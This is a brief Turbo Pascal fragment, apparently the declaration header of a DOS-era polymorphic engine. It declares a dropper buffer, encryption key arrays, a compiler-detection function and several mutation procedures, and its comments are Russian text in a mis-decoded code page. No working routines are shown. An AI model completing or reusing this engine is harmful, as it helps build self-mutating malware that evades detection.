   {$M 10000, 5000, 10000}
   {***********  ˆ§¬¥¨â¥ ¤ ë¥ ª®áâ âë : ***********}
   {*}const MaxInc=9; {ª®«-¢® ¯®¤ª«îç.ä ©«®¢}         {*}
   {*}      Use = 'uses dos;';                        {*}
   {****************************************************}
   const Dr:array [1..ComLen] of byte = {$I tppes.inc};
         OldKey:array [1..40] of byte = ({$I tppek.inc});
   var Command,Compile:string;
       Dummy:byte;
       Fake:boolean;
       NewKey :array [1..40] of byte;
       Dropper:array [1..ComLen] of byte;
       Direct :array [0..17] of char;
   function DetectComp:boolean;forward;
   procedure TPPE_Mutation;forward;
   procedure TPPE_1;forward;
   procedure TPPE_2;forward;
   procedure TPPE_3;forward;
   procedure TPPE_4;forward;
   procedure TPPE_5;forward;
   procedure TPPE_6;forward;
   {*** *®«ì§®¢ â¥«ìáª¨¥ Var, Const, Label, Forward: ***}
   {*}procedure Starting;forward;                     {*}
   {****************************************************}
